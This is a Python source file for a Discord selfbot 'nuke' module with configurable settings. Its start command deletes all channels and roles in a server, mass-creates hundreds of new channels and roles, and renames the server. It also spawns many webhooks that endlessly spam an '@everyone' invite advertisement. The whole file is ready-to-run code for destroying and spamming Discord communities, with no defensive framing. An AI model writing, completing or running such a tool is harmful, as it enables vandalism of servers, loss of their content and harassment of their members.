import discord
from discord.ext import commands
import json
import asyncio
import os
from colorama import Fore, Style
import random

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.webhook_spam = True
        self.config_file = "nuke_config.json"
        self.excluded_guilds = [1289325760040927264]  
        self.default_config = {
            "webhook_message": "@everyone JOIN discord.gg/roster",
            "server_name": "Vulnerable Selfbot",
            "webhook_delay": 0.3,
            "channel_name": "vulnerable-nuke",
            "role_name": "Vulnerable",
            "channel_amount": 100,
            "role_amount": 100,
            "webhook_amount": 25
        }
        self.config = self.load_config()

    def load_config(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            self.save_config(self.default_config)
            return self.default_config

    def save_config(self, config):
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)

    @commands.group(invoke_without_command=True)
    async def nuke(self, ctx):
        if ctx.invoked_subcommand is None:
            await ctx.send(f"""```ansi
{Fore.CYAN}╔══════════════════════════════════════════════╗
{Fore.CYAN}║              {Fore.WHITE}NUKE CONFIG                    {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════╣
{Fore.CYAN}║                                              
{Fore.CYAN}║  {Fore.WHITE}Message     {Fore.CYAN}│ {Fore.GREEN}{self.config['webhook_message'][:20]}...{Fore.CYAN}
{Fore.CYAN}║  {Fore.WHITE}Server Name {Fore.CYAN}│ {Fore.GREEN}{self.config['server_name']}{Fore.CYAN}
{Fore.CYAN}║  {Fore.WHITE}Delay       {Fore.CYAN}│ {Fore.GREEN}{self.config['webhook_delay']}s{Fore.CYAN}
{Fore.CYAN}║  {Fore.WHITE}Channels    {Fore.CYAN}│ {Fore.GREEN}{self.config['channel_amount']}{Fore.CYAN}
{Fore.CYAN}║  {Fore.WHITE}Roles       {Fore.CYAN}│ {Fore.GREEN}{self.config['role_amount']}{Fore.CYAN}
{Fore.CYAN}║  {Fore.WHITE}Webhooks    {Fore.CYAN}│ {Fore.GREEN}{self.config['webhook_amount']}{Fore.CYAN}
{Fore.CYAN}║                                              
{Fore.CYAN}╠══════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.WHITE}Commands:{Fore.CYAN}                                    
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}message {Fore.CYAN}    - Set webhook message             
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}name {Fore.CYAN}       - Set server name                
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}delay {Fore.CYAN}      - Set webhook delay              
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}channels {Fore.CYAN}   - Set channel amount            
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}roles {Fore.CYAN}      - Set role amount               
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}webhooks {Fore.CYAN}   - Set webhook amount            
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}reset {Fore.CYAN}      - Reset all settings            
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}start {Fore.CYAN}      - Start nuking                  
{Fore.CYAN}║  {Fore.YELLOW}• {Fore.WHITE}stop {Fore.CYAN}       - Stop webhook spam             
{Fore.CYAN}╚══════════════════════════════════════════════╝```""")

    @nuke.command()
    async def message(self, ctx, *, msg):
        self.config["webhook_message"] = msg
        self.save_config(self.config)
        await ctx.send(f"```Webhook message set to: {msg}```")

    @nuke.command()
    async def name(self, ctx, *, name):
        self.config["server_name"] = name
        self.save_config(self.config)
        await ctx.send(f"```Server name set to: {name}```")

    @nuke.command()
    async def delay(self, ctx, delay: float):
        if delay < 0.1:
            await ctx.send("```Delay must be at least 0.1 seconds```")
            return
        self.config["webhook_delay"] = delay
        self.save_config(self.config)
        await ctx.send(f"```Webhook delay set to: {delay}s```")

    @nuke.command()
    async def channels(self, ctx, amount: int):
        if not 1 <= amount <= 500:
            await ctx.send("```Channel amount must be between 1 and 500```")
            return
        self.config["channel_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"```Channel amount set to: {amount}```")

    @nuke.command()
    async def roles(self, ctx, amount: int):
        if not 1 <= amount <= 250:
            await ctx.send("```Role amount must be between 1 and 250```")
            return
        self.config["role_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"```Role amount set to: {amount}```")

    @nuke.command()
    async def webhooks(self, ctx, amount: int):
        if not 1 <= amount <= 50:
            await ctx.send("```Webhook amount must be between 1 and 50```")
            return
        self.config["webhook_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"```Webhook amount set to: {amount}```")

    @nuke.command()
    async def reset(self, ctx):
        self.config = self.default_config.copy()
        self.save_config(self.config)
        await ctx.send("```All nuke settings reset to default```")

    @nuke.command()
    async def stop(self, ctx):
        self.webhook_spam = False
        await ctx.send("```Stopping all webhook spam...```")

    @nuke.command()
    async def start(self, ctx):
        if ctx.guild.id in self.excluded_guilds:
            await ctx.send("```This server is protected```")
            return

        await ctx.send("```Are you sure you want to nuke this server? Type 'yes' to continue```")
        
        try:
            msg = await self.bot.wait_for('message', 
                                        check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                                        timeout=30.0)
            if msg.content.lower() != "yes":
                await ctx.send("```Operation cancelled```")
                return
        except asyncio.TimeoutError:
            await ctx.send("```Operation timed out```")
            return

        self.webhook_spam = True
        await ctx.send("```Starting nuke process...```")

        async def spam_webhook(webhook):
            while self.webhook_spam:
                try:
                    await webhook.send(content=self.config["webhook_message"])
                    await asyncio.sleep(self.config["webhook_delay"])
                except:
                    break

        async def create_webhook_channel(name, num):
            try:
                channel = await ctx.guild.create_text_channel(f"{name}-{num}")
                webhooks = []
                for i in range(self.config["webhook_amount"]):
                    webhook = await channel.create_webhook(name=f"Vulnerable-{i+1}")
                    webhooks.append(webhook)
                for webhook in webhooks:
                    asyncio.create_task(spam_webhook(webhook))
                return True
            except:
                return False

        try:
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                except:
                    pass

            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                    except:
                        pass

            for i in range(self.config["channel_amount"]):
                await create_webhook_channel(self.config["channel_name"], i+1)
                await asyncio.sleep(0.1)

            for i in range(self.config["role_amount"]):
                try:
                    await ctx.guild.create_role(name=f"{self.config['role_name']}-{i+1}")
                except:
                    pass

            try:
                await ctx.guild.edit(name=self.config["server_name"])
            except:
                pass

            await ctx.send("```Nuke completed successfully```")

        except Exception as e:
            await ctx.send(f"```Error during nuke: {str(e)}```")

def setup(bot):
    bot.add_cog(Nuke(bot))
